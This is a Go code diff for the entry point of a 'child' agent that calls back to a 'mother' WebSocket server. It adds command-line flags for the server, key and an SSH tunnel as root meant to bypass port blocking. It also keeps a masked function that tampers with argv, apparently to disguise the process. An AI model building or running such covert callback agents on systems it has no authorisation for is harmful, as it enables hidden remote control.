@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"flag"
 	"log"
 	"os"
 	"os/signal"
@@ -11,20 +12,30 @@ import (
 	"github.com/huanxherta/hx-snack/internal/child"
 )
 
-// ====== 硬编码配置（编译时修改这里） ======
+// ====== 默认配置（命令行参数可覆盖） ======
 const (
-	motherURL = "ws://<YOUR_HOST>:10300/api/stream"
-	motherKey = "<YOUR_KEY>"
+	defaultMotherURL = "ws://0.0.0.0.0.0.0:10300/api/stream"
+	defaultMotherKey = "REMOVED-KEY"
 
-	// SSH 隧道（绕过端口封锁，22→10300）
-	sshTunnel = false          // 启用 SSH 隧道
-	sshHost   = "0.0.0.0.0.0.0"
-	sshPort   = "22"
-	sshUser   = "root"
-	sshKey    = ""             // 私钥路径（优先）
-	sshPass   = ""             // 密码（无密钥时用）
-	tunnelPort = "10399"       // 本地转发端口
+	defaultSSHHost    = "0.0.0.0.0.0.0"
+	defaultSSHPort    = "22"
+	defaultSSHUser    = "root"
+	defaultTunnelPort = "10399"
 )
+
+// ====== 命令行参数 ======
+var (
+	flagMotherURL  = flag.String("host", "", "mother WebSocket URL (default: "+defaultMotherURL+")")
+	flagMotherKey  = flag.String("key", "", "pre-shared key (default: "+defaultMotherKey+")")
+	flagSSH        = flag.Bool("ssh", false, "enable SSH tunnel")
+	flagSSHHost    = flag.String("ssh-host", "", "SSH host (default: "+defaultSSHHost+")")
+	flagSSHPort    = flag.String("ssh-port", "", "SSH port (default: "+defaultSSHPort+")")
+	flagSSHUser    = flag.String("ssh-user", "", "SSH user (default: "+defaultSSHUser+")")
+	flagSSHKey     = flag.String("ssh-key", "", "SSH private key path")
+	flagSSHPass    = flag.String("ssh-pass", "", "SSH password")
+	flagTunnelPort = flag.String("tunnel-port", "", "local tunnel port (default: "+defaultTunnelPort+")")
+)
+
 // ========================================
 
 func xxxxxxxxProcess() {
@@ -41,14 +52,44 @@ func xxxxxxxxProcess() {
 func main() {
 	xxxxxxxxProcess()
 
+	// Parse flags silently — xxxxxxxxProcess messes with argv but flag pkg
+	// reads os.Args before we corrupt it, so this should be fine.
+	flag.CommandLine.SetOutput(os.Stderr)
+	flag.Parse()
+
+	motherURL := defaultMotherURL
+	motherKey := defaultMotherKey
+	if *flagMotherURL != "" {
+		motherURL = *flagMotherURL
+	}
+	if *flagMotherKey != "" {
+		motherKey = *flagMotherKey
+	}
+
 	agent := child.NewAgent(motherURL, motherKey, "dev")
-	agent.SSHTunnel = sshTunnel
-	agent.SSHHost = sshHost
-	agent.SSHPort = sshPort
-	agent.SSHUser = sshUser
-	agent.SSHKey = sshKey
-	agent.SSHPass = sshPass
-	agent.TunnelPort = tunnelPort
+
+	if *flagSSH || *flagSSHKey != "" || *flagSSHPass != "" {
+		agent.SSHTunnel = true
+	}
+	agent.SSHHost = defaultSSHHost
+	agent.SSHPort = defaultSSHPort
+	agent.SSHUser = defaultSSHUser
+	agent.SSHKey = *flagSSHKey
+	agent.SSHPass = *flagSSHPass
+	agent.TunnelPort = defaultTunnelPort
+
+	if *flagSSHHost != "" {
+		agent.SSHHost = *flagSSHHost
+	}
+	if *flagSSHPort != "" {
+		agent.SSHPort = *flagSSHPort
+	}
+	if *flagSSHUser != "" {
+		agent.SSHUser = *flagSSHUser
+	}
+	if *flagTunnelPort != "" {
+		agent.TunnelPort = *flagTunnelPort
+	}
 
 	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer cancel()
